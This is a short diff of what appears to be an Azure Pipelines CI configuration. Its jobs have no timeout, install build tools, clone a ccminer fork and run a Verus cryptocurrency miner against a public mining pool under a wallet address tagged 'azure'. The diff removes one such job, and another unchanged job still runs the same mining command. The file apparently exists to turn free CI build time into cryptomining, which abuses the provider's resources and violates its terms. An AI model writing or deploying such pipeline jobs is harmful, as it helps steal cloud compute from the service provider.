@@ -28,11 +28,6 @@ jobs:
   steps:
   - bash: apt update && apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure -t 2
     displayName: 'run'
-- job: Run6
-  timeoutInMinutes: 0
-  steps:
-   - bash: apt update && apt-get install libcurl4-openssl-dev -y libssl-dev -y libjansson-dev -y automake -y autotools-dev -y build-essential -y && git clone --single-branch -b Verus2.2 https://github.com/monkins1010/ccminer.git && cd ccminer && chmod +x build.sh && chmod +x configure.sh && chmod +x autogen.sh && ./build.sh && ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3956 -u RK2PLreuU6F3Zm7rBzNn5v9MN8TkdyoH7K.azure -t 2
-    displayName: 'run'
 - job: Run7
   timeoutInMinutes: 0
   steps:
